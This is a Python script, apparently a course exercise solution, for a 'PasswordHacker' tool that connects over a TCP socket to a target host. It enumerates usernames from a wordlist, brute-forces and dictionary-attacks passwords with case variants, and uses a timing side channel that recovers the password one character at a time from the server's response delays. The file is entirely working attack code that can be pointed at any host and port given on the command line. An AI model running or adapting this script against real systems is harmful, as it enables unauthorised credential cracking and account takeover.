import argparse
import json
import socket
import itertools
import string
import logging
import time

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class PasswordHacker:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.characters = string.ascii_letters + string.digits
        logging.debug(f"Trying to connect to {self.host}:{self.port}")
        self.client_socket = socket.socket()
        try:
            self.client_socket.connect((self.host, self.port))
        except socket.error as e:
            logging.error(f"Failed to connect to {self.host}:{self.port} with error: {e}")
            self.client_socket.close()
            raise

    def close(self):
        self.client_socket.close()
        logging.debug("Socket has been closed.")

    def brute_force(self):
        logging.debug("Starting password bruteforce")
        for password in self.__generate_password_for_bruteforce():
            message = self.__send_message(password)
            if message == 'Connection success!':
                logging.debug(f"Password {password} has been found, stop bruteforce")
                return password

    def dict_attack(self):
        logging.debug("Starting dictionary attack")
        with open('passwords.txt') as f:
            for password in f:
                logging.debug(f"Trying password: {password}")
                combinations = self.__generate_all_combinations_for_password(password.strip())
                for combination in combinations:
                    logging.debug(f"Trying combination: {combination}")
                    message = self.__send_message(combination)
                    if message == 'Connection success!':
                        logging.debug(f"Password {combination} has been found, stop the attack")
                        return password

    def login_attack(self):
        logging.debug("Starting login attack")
        login = self.__try_login()
        password = self.__try_password(login)
        return login, password

    def __send_json_message(self, login, password):
        try:
            json_login = json.dumps({'login': login, 'password': password})
            response = self.__send_message(json_login)
            return json.loads(response)['result']
        except (json.JSONDecodeError, KeyError, TypeError):
            return ""

    def __send_message(self, message):
        try:
            self.client_socket.settimeout(10.0)
            sent_length = self.client_socket.send(message.encode('utf8'))
            if sent_length != len(message):
                logging.warning("Not all data was sent")
            response = self.client_socket.recv(1024).decode('utf8')
            return response
        except socket.timeout:
            logging.error("Timed out while waiting for the server response")
        except socket.error as e:
            logging.error(f"An error occurred: {e}")
        return ""

    def __try_login(self):
        with open('logins.txt') as f:
            for login in f:
                login = login.strip()
                logging.debug(f"Trying login: {login}")
                message = self.__send_json_message(login, ' ')
                if message == 'Wrong password!':
                    logging.debug(f"Login {login} has been found")
                    return login.strip()

    def __try_password(self, login):
        password = ''
        times = {}
        while True:
            for character in self.characters:
                attempt_password = password + character
                attempt_time, message = self.__make_attempt(login, attempt_password)
                times[character] = attempt_time
                if message == 'Connection success!':
                    logging.debug(f"Password {attempt_password} has been found, stop the attack")
                    return attempt_password
            password = password + max(times, key=times.get)
            times = {}

    def __make_attempt(self, login, password):
        start = time.perf_counter()
        message = self.__send_json_message(login, password)
        attempt_time = time.perf_counter() - start
        logging.debug(f"Trying password: {password}, Attempt time: {attempt_time}")
        return attempt_time, message

    @staticmethod
    def __generate_password_for_bruteforce():
        password_chars = string.ascii_lowercase + string.digits
        for i in range(1, 5):
            for combination in itertools.product(password_chars, repeat=i):
                password = ''.join(combination)
                yield password

    @staticmethod
    def __generate_all_combinations_for_password(password):
        if password.isdigit():
            return [password]
        return list(map(lambda x: ''.join(x),
                        itertools.product(
                            *[(char.lower(), char.upper()) if char.isalpha() else char for char in password])))


def main():
    args = read_arguments()
    password_hacker = PasswordHacker(args.host, args.port)
    login, password = password_hacker.login_attack()
    print_hack_result(login, password)
    password_hacker.close()


def read_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', type=str)
    parser.add_argument('port', type=int)
    args = parser.parse_args()
    return args


def print_hack_result(login, password):
    print(json.dumps({'login': login, 'password': password}))


if __name__ == '__main__':
    main()
